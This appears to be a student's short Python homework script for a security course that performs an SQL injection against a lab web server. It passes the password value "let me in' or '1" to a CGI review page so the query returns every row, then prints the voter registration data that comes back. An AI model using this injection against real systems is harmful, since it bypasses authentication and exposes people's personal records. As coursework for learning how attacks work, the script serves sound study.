#!/usr/bin/env python3

#Garrett Gregory
#CSCI 461
#Assignment 6

# This is an SQL injection exploit that modifies an SQL query by taking adding
# in some added ' characters to change the query instead of simply supplying a
# value for each attribute.

import requests
import sys

if len(sys.argv) != 1:
    print("Usage: python3 hw6exploit.py")
    #example: python3 hw6exploit.py

else:
    #supply the "or true" argument so the sql query grabs all tuples instead of the one specified
    r = requests.get("http://192.168.56.2:6789/cgi-bin/review.pl", params={'debug':1, 'wwid':'DEADBEEFBRO', 'password':"let me in' or '1"})
    #trim off html code from text, then print the entirety of the voter registration data
    results = r.text[3917:-1].split("</pre>")[0]
    print(results)
